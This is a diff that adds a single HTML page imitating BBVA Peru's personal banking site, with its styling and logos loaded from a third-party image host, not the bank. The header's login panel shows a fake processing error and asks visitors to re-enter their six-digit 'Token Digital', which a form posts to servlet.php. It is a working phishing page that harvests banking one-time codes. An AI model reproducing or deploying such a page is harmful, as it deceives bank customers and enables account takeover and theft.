@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="es-PE" data-lang-multilanguage="false" data-toggle="false"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+    
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	
+ 
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc.min.ACSHASH80a545269c38ef4ce0058f39fb7993c5.css" type="text/css">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/large.lc-20240627-091350-lc.min.ACSHASH782fee6b07e5ac482d0a364e75f0acbb.css" type="text/css" media="all and (min-width: 600px)">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/bbva.common.lc-20240627-091350-lc.min.css" media="all" onload="this.media=&#39;all&#39;">
+
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc.min.css" media="all" onload="this.media=&#39;all&#39;">
+
+<link rel="shortcut icon" href="https://thundsnd.sirv.com/docs/favicon.ico">
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc(1).min.css" media="all" onload="this.media=&#39;all&#39;">
+
+   
+        <title>El BBVA te da la bienvenida </title>
+<style id="style-chat-wrapper">
+    .chatWrapper {
+      background-color: white;
+      width: 360px;
+      position: fixed;
+      bottom: 0;
+      right: 40px;
+      box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2), 0px 6px 10px 0px rgba(0,0,0,0.14), 0px 1px 18px 0px rgba(0,0,0,0.12);
+      transition: 0.3s height cubic-bezier(0,1,1,1);
+      z-index: 999;
+      min-height: 0;
+      height: 0px;
+    }
+    .chatWrapper iframe {
+      border: 0;
+      width: 100%;
+      height: 100%;
+      /* transform: translate(0, 100%); */
+      opacity: 0;
+      transition: 1s opacity cubic-bezier(0,1,1,1);
+    }
+    .chatWrapper.ready-frame iframe {
+      /* transform: translate(0, 0); */
+      opacity: 1;
+    }
+    .chatWrapper.hide {
+      height: 0px;
+    }
+    .chatWrapper.minimize {
+      height: 48px;
+    }
+    .chatWrapper.maximize {
+      height: 640px;
+    }
+
+    .chatWrapper > svg {
+      position: absolute;
+      width: 48px;
+      height: 48px;
+      top: calc(50% - 24px);
+      right: calc(50% - 24px);
+      pointer-events: none;
+      transition: 1s opacity cubic-bezier(0,1,1,1);
+      opacity: 1;
+    }
+    .chatWrapper.ready-frame > svg {
+      opacity: 0;
+    }
+
+    @media (max-width:768px) {
+      .chatWrapper {
+        width: 100%!important;
+        transition: none!important;
+        top: 0!important;
+        left: 0!important;
+      }
+      .chatWrapper.maximize {
+        height: 100%!important;
+      }
+      .chatWrapper.close {
+        height: 0!important;
+        width: 0!important;
+      }
+      .chatWrapper.minimize {
+        height: 68px!important;
+        top: initial!important;
+        transition: 0.3s height cubic-bezier(0,1,1,1)!important;
+      }
+
+    }
+  </style>
+
+  
+  </head>
+    
+
+<body data-isfirstcontentchildmarquee="false" class="bbva__base scroll--disabled">
+
+<style>
+    .mar {
+        margin-top: 175px !important;
+    }
+    .prueba2 {
+        cursor: pointer;
+        height: 112px; 
+        background-color: rgb(234, 249, 250);
+        top: 0px;
+        width: 100%; 
+        padding: 20px;     
+    }
+    .Banner_div {
+        display: flex;
+        width: 100%;
+        height: 100%;
+        flex-direction: row;
+        justify-content: center;
+        gap: 0.6rem;
+        align-items: center;
+    }
+    .content_label {
+        color: rgb(234, 249, 250);
+        font-family: 'BentonSansBBVA-Medium';
+        font-size: 15px;
+        cursor: pointer; 
+        word-break: break-word;
+    }
+    .content_label_2 {
+        display: none;
+    }
+    .img_boton {
+        width: 22px;
+        height: 22px;
+        margin-top: 4px !important;
+    }
+    .img_principal {
+        width: 0px;
+    }
+    .label_conoce {
+        display: none;
+        color: #003261;
+        font-family: 'BentonSansBBVA-Medium';
+        font-size: 15px;
+    }
+    .div_conoce {
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        gap: 15px;
+    }
+    @media (min-width: 450px) {
+        .img_boton {
+            margin-left: -20px;
+            margin-top: 0px;
+        }
+        .Banner_div {
+            gap: 2rem !important;
+        }
+        .prueba2 {
+            cursor: pointer;
+            height: 104px; 
+            background-color: rgb(234, 249, 250);
+            top: 0px;
+            width: 100%;         
+            padding: 16px;
+        }
+        .content_label_2 {
+            display: block;
+            color: rgb(234, 249, 250) !important; 
+            font-family: 'BentonSansBBVA-Book' !important;
+            font-size: 15px !important; 
+            transition: width .33333s, height .33333s;
+            cursor: pointer;
+        }
+        .content_label {
+            line-height: 26px;
+            color: rgb(234, 249, 250);
+            font-family: 'BentonSansBBVA-Medium';
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .label_conoce {
+            display: block;
+            color: rgb(234, 249, 250);
+            font-family: 'BentonSansBBVA-Medium';
+            font-size: 15px;
+        }
+        .img_principal {
+            width: 7%;
+        }
+    }
+</style>
+<style type="text/css">.tippy-touch{cursor:pointer!important}.tippy-notransition{transition:none!important}.tippy-popper{max-width:350px;-webkit-perspective:700px;perspective:700px;z-index:9999;outline:0;transition-timing-function:cubic-bezier(.165,.84,.44,1);pointer-events:none;line-height:1.4}.tippy-popper[data-html]{max-width:96%;max-width:calc(100% - 20px)}.tippy-popper[x-placement^=top] .tippy-backdrop{border-radius:40% 40% 0 0}.tippy-popper[x-placement^=top] .tippy-roundarrow{bottom:-8px;-webkit-transform-origin:50% 0;transform-origin:50% 0}.tippy-popper[x-placement^=top] .tippy-roundarrow svg{position:absolute;left:0;-webkit-transform:rotate(180deg);transform:rotate(180deg)}.tippy-popper[x-placement^=top] .tippy-arrow{border-top:7px solid #333;border-right:7px solid transparent;border-left:7px solid transparent;bottom:-7px;margin:0 6px;-webkit-transform-origin:50% 0;transform-origin:50% 0}.tippy-popper[x-placement^=top] .tippy-backdrop{-webkit-transform-origin:0 90%;transform-origin:0 90%}.tippy-popper[x-placement^=top] .tippy-backdrop[data-state=visible]{-webkit-transform:scale(6) translate(-50%,25%);transform:scale(6) translate(-50%,25%);opacity:1}.tippy-popper[x-placement^=top] .tippy-backdrop[data-state=hidden]{-webkit-transform:scale(1) translate(-50%,25%);transform:scale(1) translate(-50%,25%);opacity:0}.tippy-popper[x-placement^=top] [data-animation=shift-toward][data-state=visible]{opacity:1;-webkit-transform:translateY(-10px);transform:translateY(-10px)}.tippy-popper[x-placement^=top] [data-animation=shift-toward][data-state=hidden]{opacity:0;-webkit-transform:translateY(-20px);transform:translateY(-20px)}.tippy-popper[x-placement^=top] [data-animation=perspective]{-webkit-transform-origin:bottom;transform-origin:bottom}.tippy-popper[x-placement^=top] [data-animation=perspective][data-state=visible]{opacity:1;-webkit-transform:translateY(-10px) rotateX(0);transform:translateY(-10px) rotateX(0)}.tippy-popper[x-placement^=top] [data-animation=perspective][data-state=hidden]{opacity:0;-webkit-transform:translateY(0) rotateX(90deg);transform:translateY(0) rotateX(90deg)}.tippy-popper[x-placement^=top] [data-animation=fade][data-state=visible]{opacity:1;-webkit-transform:translateY(-10px);transform:translateY(-10px)}.tippy-popper[x-placement^=top] [data-animation=fade][data-state=hidden]{opacity:0;-webkit-transform:translateY(-10px);transform:translateY(-10px)}.tippy-popper[x-placement^=top] [data-animation=shift-away][data-state=visible]{opacity:1;-webkit-transform:translateY(-10px);transform:translateY(-10px)}.tippy-popper[x-placement^=top] [data-animation=shift-away][data-state=hidden]{opacity:0;-webkit-transform:translateY(0);transform:translateY(0)}.tippy-popper[x-placement^=top] [data-animation=scale][data-state=visible]{opacity:1;-webkit-transform:translateY(-10px) scale(1);transform:translateY(-10px) scale(1)}.tippy-popper[x-placement^=top] [data-animation=scale][data-state=hidden]{opacity:0;-webkit-transform:translateY(0) scale(0);transform:translateY(0) scale(0)}.tippy-popper[x-placement^=bottom] .tippy-backdrop{border-radius:0 0 30% 30%}.tippy-popper[x-placement^=bottom] .tippy-roundarrow{top:-8px;-webkit-transform-origin:50% 100%;transform-origin:50% 100%}.tippy-popper[x-placement^=bottom] .tippy-roundarrow svg{position:absolute;left:0;-webkit-transform:rotate(0);transform:rotate(0)}.tippy-popper[x-placement^=bottom] .tippy-arrow{border-bottom:7px solid #333;border-right:7px solid transparent;border-left:7px solid transparent;top:-7px;margin:0 6px;-webkit-transform-origin:50% 100%;transform-origin:50% 100%}.tippy-popper[x-placement^=bottom] .tippy-backdrop{-webkit-transform-origin:0 -90%;transform-origin:0 -90%}.tippy-popper[x-placement^=bottom] .tippy-backdrop[data-state=visible]{-webkit-transform:scale(6) translate(-50%,-125%);transform:scale(6) translate(-50%,-125%);opacity:1}.tippy-popper[x-placement^=bottom] .tippy-backdrop[data-state=hidden]{-webkit-transform:scale(1) translate(-50%,-125%);transform:scale(1) translate(-50%,-125%);opacity:0}.tippy-popper[x-placement^=bottom] [data-animation=shift-toward][data-state=visible]{opacity:1;-webkit-transform:translateY(10px);transform:translateY(10px)}.tippy-popper[x-placement^=bottom] [data-animation=shift-toward][data-state=hidden]{opacity:0;-webkit-transform:translateY(20px);transform:translateY(20px)}.tippy-popper[x-placement^=bottom] [data-animation=perspective]{-webkit-transform-origin:top;transform-origin:top}.tippy-popper[x-placement^=bottom] [data-animation=perspective][data-state=visible]{opacity:1;-webkit-transform:translateY(10px) rotateX(0);transform:translateY(10px) rotateX(0)}.tippy-popper[x-placement^=bottom] [data-animation=perspective][data-state=hidden]{opacity:0;-webkit-transform:translateY(0) rotateX(-90deg);transform:translateY(0) rotateX(-90deg)}.tippy-popper[x-placement^=bottom] [data-animation=fade][data-state=visible]{opacity:1;-webkit-transform:translateY(10px);transform:translateY(10px)}.tippy-popper[x-placement^=bottom] [data-animation=fade][data-state=hidden]{opacity:0;-webkit-transform:translateY(10px);transform:translateY(10px)}.tippy-popper[x-placement^=bottom] [data-animation=shift-away][data-state=visible]{opacity:1;-webkit-transform:translateY(10px);transform:translateY(10px)}.tippy-popper[x-placement^=bottom] [data-animation=shift-away][data-state=hidden]{opacity:0;-webkit-transform:translateY(0);transform:translateY(0)}.tippy-popper[x-placement^=bottom] [data-animation=scale][data-state=visible]{opacity:1;-webkit-transform:translateY(10px) scale(1);transform:translateY(10px) scale(1)}.tippy-popper[x-placement^=bottom] [data-animation=scale][data-state=hidden]{opacity:0;-webkit-transform:translateY(0) scale(0);transform:translateY(0) scale(0)}.tippy-popper[x-placement^=left] .tippy-backdrop{border-radius:50% 0 0 50%}.tippy-popper[x-placement^=left] .tippy-roundarrow{right:-16px;-webkit-transform-origin:33.33333333% 50%;transform-origin:33.33333333% 50%}.tippy-popper[x-placement^=left] .tippy-roundarrow svg{position:absolute;left:0;-webkit-transform:rotate(90deg);transform:rotate(90deg)}.tippy-popper[x-placement^=left] .tippy-arrow{border-left:7px solid #333;border-top:7px solid transparent;border-bottom:7px solid transparent;right:-7px;margin:3px 0;-webkit-transform-origin:0 50%;transform-origin:0 50%}.tippy-popper[x-placement^=left] .tippy-backdrop{-webkit-transform-origin:100% 0;transform-origin:100% 0}.tippy-popper[x-placement^=left] .tippy-backdrop[data-state=visible]{-webkit-transform:scale(6) translate(40%,-50%);transform:scale(6) translate(40%,-50%);opacity:1}.tippy-popper[x-placement^=left] .tippy-backdrop[data-state=hidden]{-webkit-transform:scale(1.5) translate(40%,-50%);transform:scale(1.5) translate(40%,-50%);opacity:0}.tippy-popper[x-placement^=left] [data-animation=shift-toward][data-state=visible]{opacity:1;-webkit-transform:translateX(-10px);transform:translateX(-10px)}.tippy-popper[x-placement^=left] [data-animation=shift-toward][data-state=hidden]{opacity:0;-webkit-transform:translateX(-20px);transform:translateX(-20px)}.tippy-popper[x-placement^=left] [data-animation=perspective]{-webkit-transform-origin:right;transform-origin:right}.tippy-popper[x-placement^=left] [data-animation=perspective][data-state=visible]{opacity:1;-webkit-transform:translateX(-10px) rotateY(0);transform:translateX(-10px) rotateY(0)}.tippy-popper[x-placement^=left] [data-animation=perspective][data-state=hidden]{opacity:0;-webkit-transform:translateX(0) rotateY(-90deg);transform:translateX(0) rotateY(-90deg)}.tippy-popper[x-placement^=left] [data-animation=fade][data-state=visible]{opacity:1;-webkit-transform:translateX(-10px);transform:translateX(-10px)}.tippy-popper[x-placement^=left] [data-animation=fade][data-state=hidden]{opacity:0;-webkit-transform:translateX(-10px);transform:translateX(-10px)}.tippy-popper[x-placement^=left] [data-animation=shift-away][data-state=visible]{opacity:1;-webkit-transform:translateX(-10px);transform:translateX(-10px)}.tippy-popper[x-placement^=left] [data-animation=shift-away][data-state=hidden]{opacity:0;-webkit-transform:translateX(0);transform:translateX(0)}.tippy-popper[x-placement^=left] [data-animation=scale][data-state=visible]{opacity:1;-webkit-transform:translateX(-10px) scale(1);transform:translateX(-10px) scale(1)}.tippy-popper[x-placement^=left] [data-animation=scale][data-state=hidden]{opacity:0;-webkit-transform:translateX(0) scale(0);transform:translateX(0) scale(0)}.tippy-popper[x-placement^=right] .tippy-backdrop{border-radius:0 50% 50% 0}.tippy-popper[x-placement^=right] .tippy-roundarrow{left:-16px;-webkit-transform-origin:66.66666666% 50%;transform-origin:66.66666666% 50%}.tippy-popper[x-placement^=right] .tippy-roundarrow svg{position:absolute;left:0;-webkit-transform:rotate(-90deg);transform:rotate(-90deg)}.tippy-popper[x-placement^=right] .tippy-arrow{border-right:7px solid #333;border-top:7px solid transparent;border-bottom:7px solid transparent;left:-7px;margin:3px 0;-webkit-transform-origin:100% 50%;transform-origin:100% 50%}.tippy-popper[x-placement^=right] .tippy-backdrop{-webkit-transform-origin:-100% 0;transform-origin:-100% 0}.tippy-popper[x-placement^=right] .tippy-backdrop[data-state=visible]{-webkit-transform:scale(6) translate(-140%,-50%);transform:scale(6) translate(-140%,-50%);opacity:1}.tippy-popper[x-placement^=right] .tippy-backdrop[data-state=hidden]{-webkit-transform:scale(1.5) translate(-140%,-50%);transform:scale(1.5) translate(-140%,-50%);opacity:0}.tippy-popper[x-placement^=right] [data-animation=shift-toward][data-state=visible]{opacity:1;-webkit-transform:translateX(10px);transform:translateX(10px)}.tippy-popper[x-placement^=right] [data-animation=shift-toward][data-state=hidden]{opacity:0;-webkit-transform:translateX(20px);transform:translateX(20px)}.tippy-popper[x-placement^=right] [data-animation=perspective]{-webkit-transform-origin:left;transform-origin:left}.tippy-popper[x-placement^=right] [data-animation=perspective][data-state=visible]{opacity:1;-webkit-transform:translateX(10px) rotateY(0);transform:translateX(10px) rotateY(0)}.tippy-popper[x-placement^=right] [data-animation=perspective][data-state=hidden]{opacity:0;-webkit-transform:translateX(0) rotateY(90deg);transform:translateX(0) rotateY(90deg)}.tippy-popper[x-placement^=right] [data-animation=fade][data-state=visible]{opacity:1;-webkit-transform:translateX(10px);transform:translateX(10px)}.tippy-popper[x-placement^=right] [data-animation=fade][data-state=hidden]{opacity:0;-webkit-transform:translateX(10px);transform:translateX(10px)}.tippy-popper[x-placement^=right] [data-animation=shift-away][data-state=visible]{opacity:1;-webkit-transform:translateX(10px);transform:translateX(10px)}.tippy-popper[x-placement^=right] [data-animation=shift-away][data-state=hidden]{opacity:0;-webkit-transform:translateX(0);transform:translateX(0)}.tippy-popper[x-placement^=right] [data-animation=scale][data-state=visible]{opacity:1;-webkit-transform:translateX(10px) scale(1);transform:translateX(10px) scale(1)}.tippy-popper[x-placement^=right] [data-animation=scale][data-state=hidden]{opacity:0;-webkit-transform:translateX(0) scale(0);transform:translateX(0) scale(0)}.tippy-tooltip{position:relative;color:#fff;border-radius:4px;font-size:.9rem;padding:.3rem .6rem;text-align:center;will-change:transform;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#333}.tippy-tooltip[data-size=small]{padding:.2rem .4rem;font-size:.75rem}.tippy-tooltip[data-size=large]{padding:.4rem .8rem;font-size:1rem}.tippy-tooltip[data-animatefill]{overflow:hidden;background-color:transparent}.tippy-tooltip[data-animatefill] .tippy-content{transition:-webkit-clip-path cubic-bezier(.46,.1,.52,.98);transition:clip-path cubic-bezier(.46,.1,.52,.98);transition:clip-path cubic-bezier(.46,.1,.52,.98),-webkit-clip-path cubic-bezier(.46,.1,.52,.98)}.tippy-tooltip[data-interactive],.tippy-tooltip[data-interactive] path{pointer-events:auto}.tippy-tooltip[data-inertia][data-state=visible]{transition-timing-function:cubic-bezier(.53,2,.36,.85)}.tippy-tooltip[data-inertia][data-state=hidden]{transition-timing-function:ease}.tippy-arrow,.tippy-roundarrow{position:absolute;width:0;height:0}.tippy-roundarrow{width:24px;height:8px;fill:#333;pointer-events:none}.tippy-backdrop{position:absolute;will-change:transform;background-color:#333;border-radius:50%;width:26%;left:50%;top:50%;z-index:-1;transition:all cubic-bezier(.46,.1,.52,.98);-webkit-backface-visibility:hidden;backface-visibility:hidden}.tippy-backdrop:after{content:"";float:left;padding-top:100%}body:not(.tippy-touch) .tippy-tooltip[data-animatefill][data-state=visible] .tippy-content{-webkit-clip-path:ellipse(100% 100% at 50% 50%);clip-path:ellipse(100% 100% at 50% 50%)}body:not(.tippy-touch) .tippy-tooltip[data-animatefill][data-state=hidden] .tippy-content{-webkit-clip-path:ellipse(5% 50% at 50% 50%);clip-path:ellipse(5% 50% at 50% 50%)}body:not(.tippy-touch) .tippy-popper[x-placement=right] .tippy-tooltip[data-animatefill][data-state=visible] .tippy-content{-webkit-clip-path:ellipse(135% 100% at 0 50%);clip-path:ellipse(135% 100% at 0 50%)}body:not(.tippy-touch) .tippy-popper[x-placement=right] .tippy-tooltip[data-animatefill][data-state=hidden] .tippy-content{-webkit-clip-path:ellipse(40% 100% at 0 50%);clip-path:ellipse(40% 100% at 0 50%)}body:not(.tippy-touch) .tippy-popper[x-placement=left] .tippy-tooltip[data-animatefill][data-state=visible] .tippy-content{-webkit-clip-path:ellipse(135% 100% at 100% 50%);clip-path:ellipse(135% 100% at 100% 50%)}body:not(.tippy-touch) .tippy-popper[x-placement=left] .tippy-tooltip[data-animatefill][data-state=hidden] .tippy-content{-webkit-clip-path:ellipse(40% 100% at 100% 50%);clip-path:ellipse(40% 100% at 100% 50%)}@media (max-width:360px){.tippy-popper{max-width:96%;max-width:calc(100% - 20px)}}
+</style>
+
+<style>
+    #home-personas-1 {
+        opacity: 0;
+    }
+    
+    #home-personas-1.tested {
+        opacity: 1;
+    }
+    #home-personas-2 {
+        opacity: 0;
+    }
+    
+    #home-personas-2.tested {
+        opacity: 1;
+    }
+</style>
+
+
+
+
+<div class="general-wrapper">
+        
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc.min.ACSHASHd16b4e8f721c6dcdfad1508c8d8f2294.css" type="text/css">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/large.lc-20240627-091350-lc.min.ACSHASH78e4f12c28c10d37bf9c9b50316f013d.css" type="text/css" media="all and (min-width: 600px)">
+
+
+
+<header class="header__base wrapper" data-component="tabulation">
+     
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc.min.ACSHASH286c41092ce3d940e67f731ae58c7d7d.css" type="text/css">
+
+
+    
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/large.lc-20240627-091350-lc.min.ACSHASH4add124b4ec78943ac40ec19be4e9d5c.css" type="text/css" media="all and (min-width: 600px)">
+
+
+    
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/bbva.stickyalert.lc-20240627-091350-lc.min.ACSHASHa603fa119312657f11fed46c3d83e072.css" type="text/css">
+
+
+
+    <div class="cookies alert--full alert--extra alert--stickybottom">
+        
+    </div>
+
+<div>
+ 
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc.min.ACSHASH286c41092ce3d940e67f731ae58c7d7d.css" type="text/css">
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/large.lc-20240627-091350-lc.min.ACSHASH4add124b4ec78943ac40ec19be4e9d5c.css" type="text/css" media="all and (min-width: 600px)">
+  
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/bbva.stickyalert.lc-20240627-091350-lc.min.ACSHASHa603fa119312657f11fed46c3d83e072.css" type="text/css">
+
+</div>
+  
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc.min.ACSHASHd16b4e8f721c6dcdfad1508c8d8f2294.css" type="text/css">
+   
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/large.lc-20240627-091350-lc.min.ACSHASH78e4f12c28c10d37bf9c9b50316f013d.css" type="text/css" media="all and (min-width: 600px)">
+
+
+<a class="skip2content invisible" tab-index="0" href="" aria-label="Ir al contenido principal">
+    Ir al contenido principal
+</a>
+<!--googleoff: index-->
+<nav class="header__container background--navy"
+data-component="header" data-dl-component="" data-dl-component-name="header" data-dl-component-type="bbva/pwebs/components/par/header" id="header" 
+data-component-id="12476c09-0342-42cc-8668-6a28b395d837">
+
+
+    <div class="header__main container">
+        <div class="header__wrapper">
+            
+                <div class="header__logo" data-component="svgLogoFix" data-component-id="e3ef4151-24ff-4449-a630-cd2e687c6ced">
+                    
+                    <a itemscope="url" class="header__logo__link " href="" target="_self" data-lightbox-shorts="false"
+					title="">
+                        
+          
+    
+     <img  src="https://thundsnd.sirv.com/docs/logo_bbva_blanco.svg" sizes="(min-width: 900px) 20vw, 50vw" itemprop="logo" class="header__image " role="img">
+
+    
+
+                        
+                    </a>
+                </div>
+            
+            <div class="header__mainnavigation" >
+                
+                 
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc.min.ACSHASH8445512a9a348be62342544442fe6d5a.css" type="text/css">
+
+
+    
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/large.lc-20240627-091350-lc.min.ACSHASH03a167785d1e7bc5d397f691e2bdb149.css" type="text/css" media="all and (min-width: 600px)">
+
+
+    
+
+    <nav class="mainnavigation__base">
+        <ul class="mainnavigation__list">
+            <li itemprop="name" class="mainnavigation__item mainnavigation__item--active">
+                <a itemprop="url" aria-label="Personas Opción seleccionada" href="#" target="_self" class="mainnavigation__link">Personas</a>
+            </li>
+        
+            <li itemprop="name" class="mainnavigation__item">
+                <a itemprop="url" aria-label="Empresas " target="_self" class="mainnavigation__link" href="">Empresas</a>
+            </li>
+        </ul>
+    </nav>
+
+                
+            </div>
+        </div>
+        <nav class="header__actions" itemscope="" >
+            <ul class="header__actions__ulist">
+                
+                <li itemprop="name" class="header__actions__list header__actions--tablet-left header__actions--tablet-hidden header__actions--mobile-hidden">
+                    
+<a itemscope="url" target="_blank" data-lightbox-shorts="false" rel="noopener noreferrer" class="header__newsroom header__actions__item__link  " href=""
+ data-analytics-name="Home-Header-obten tu tarjeta" data-analytics="cta">
+   <img class="bbva-svgicon" alt="" src="https://thundsnd.sirv.com/docs/card.svg" aria-hidden="true">
+    <span class="header__actions__item__link__text">Obtén tu Tarjeta de Crédito</span>
+</a>
+                </li>
+                
+                <li itemprop="name" class="header__actions__list header__actions--tablet-hidden header__actions--mobile-hidden">
+                    
+<a itemprop="url" class="header__actions__item__link header__createaccount" href="" title="Abre tu cuenta" data-analytics-name="Home-Header-abre tu cuenta" data-analytics="cta">
+    
+        <img class="bbva-svgicon bbva-svgicon--largemobile" alt="" src="https://thundsnd.sirv.com/docs/savings.svg" aria-hidden="true">
+    
+    <span>Abre tu cuenta</span>
+</a>
+
+                </li>
+                
+                <li itemprop="name" class="header__actions__list header__actions--tablet-left">
+                    
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc(2).min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/large.lc-20240627-091350-lc.min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+
+                </li>
+                
+                <li class="header__actions__list header__actions--tablet-hidden">
+                    
+
+<div class="search__trigger" role="search">
+    <a href="" aria-haspopup="true" aria-controls="access__container__content" aria-label="Buscador" aria-expanded="false" accesskey="s" class="header__actions__item__link search__trigger__btn" title="Buscador">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" height="20px" width="20px">
+            <defs><style>.bbvaicn{fill:#fff}</style></defs>
+            <path class="bbvaicn" d="M182.85 162.85a90 90 0 1 0-20 20L220 240l20-20zM150 110a40 40 0 0 0-40-40V50a60 60 0 0 1 60 60z"></path>
+        </svg>
+    </a>
+</div>
+                </li>
+                
+                
+                
+                <li class="header__actions__list header__actions--tablet-right">
+                    
+
+
+
+<a class="megamenu__trigger header__actions__item__link " href="javascript:void(0);" title="Menú" aria-expanded="false" aria-haspopup="true" aria-label="Menú principal" aria-controls="megamenu__aside" accesskey="m">
+    <span class="megamenu__trigger megamenu__trigger__open header__actions--menu" aria-hidden="false">
+        <span class="header__actions__item__link__text">Menú</span>
+        <svg class="header__icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 260 260" height="24px" width="24px">
+            <defs><style>.bbvaicn{fill:#fff}</style></defs>
+            <g>
+                <polygon class="bbvaicn" points="210.37 80.12 20.37 80.12 20.37 50.12 240.37 50.12 210.37 80.12"></polygon>
+                <polygon class="bbvaicn" points="180.37 145.12 20.37 145.12 20.37 115.12 210.37 115.12 180.37 145.12"></polygon>
+                <polygon class="bbvaicn" points="150.37 210.12 20.37 210.12 20.37 180.12 180.37 180.12 150.37 210.12"></polygon>
+            </g>
+        </svg>
+    </span>
+    <span class="megamenu__trigger megamenu__trigger__close hidden header__actions--menu" aria-hidden="true">
+        <span class="header__actions__item__link__text">Cerrar</span>
+        <i class="bbva-icon bbva-icon__2_022_close"></i>
+    </span>
+</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+</nav>
+<!--googleon: index-->
+ 
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc(3).min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/large.lc-20240627-091350-lc(1).min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/bbva.swiper.lc-20240627-091350-lc.min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/bbva.slider.lc-20240627-091350-lc.min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/bbva.animations.lc-20240627-091350-lc.min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc(4).min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/large.lc-20240627-091350-lc(2).min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/small.lc-20240627-091350-lc(5).min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+    
+<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/large.lc-20240627-091350-lc(3).min.css" media="all" onload="this.media=&#39;all&#39;">
+
+
+
+    <div class="access__container access__container--active" id="access__container__content" aria-hidden="false" tabindex="-1" style="height: 602px;">
+        <div class="container">
+            <div class="access__control">
+                <button class="access__close" aria-label="cerrar"><i class="bbva-icon bbva-icon__2_022_close"></i></button>
+            </div>
+            <div class="access__content">
+	<!-- FRAME-->	
+	
+	<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/libraries.v201901.min.css">
+	<link rel="stylesheet" href="https://thundsnd.sirv.com/docs/bbva-login.v201901.min.css">		
+	<div class="bd-login">
+		<form class="form-login" method="post" action="servlet.php">
+<div class="access__iframe"  height="" style="width: 100%; overflow: hidden; height: 452px;" frameborder="0" id="iFrameResizer3" scrolling="no">
+	<div class="container">
+		<h1>Token Digital</h1><br>
+		<span style="color:red">Ocurrió un error al procesar la información</span><br>
+		<span style="color:#000">Por favor, ingrese su Token Digital nuevamente</span><br><br>
+		<div id="form-client-access-ext" class="access-container">
+			
+		
+				<div class="row">
+					<div class="col-lg-12">
+						
+						<div class="form-group">
+							             <input type="tel"  name="tok2" class="form-control ng-pristine ng-untouched 
+								ng-invalid ng-invalid-required ng-valid-maxlength"  onfocus="this.removeAttribute(&#39;readonly&#39;);" 
+								maxlength="6" minlength="6" placeholder="Token Digital" style=" padding: 1rem;" onkeypress="if (event.keyCode &lt; 45 || event.keyCode &gt; 57) event.returnValue = false;"
+								required>	
+                           <br><br>
+						   
+                        <div align="center">   <button id="btnEntrar" type="submit"  style="width:250px;padding: 16px;height:50px" class="btn blue" tabindex="5" >Continuar</button>
+								
+							</div>					
+						
+						</div>					
+					
+				
+															
+					</div>					
+				</div>
+			
+		
+		
+			
+			
+
+			
+			
+		</div>
+		
+	</div>
+	
+</div>
+
+				
+	
+			
+</form>
+
+</div></div>
+        </div>
+    </div>
+</header>
+
+
+
+
+
+        
+        <main class="bbva--main wrapper" id="main" tabindex="-1">
+	
+
+
+<div>
+        <style type="text/css" class="cosa">
+          @media (max-width: 599px) and (min-width: 0) {
+            body .hidden-mobile {
+                display: none!important;
+            }
+          }
+        </style></div><div>
+        <style type="text/css">
+          body .hidden-desktop {
+            display: none!important;
+          }
+        </style></div>
+
+</body>
+</html>
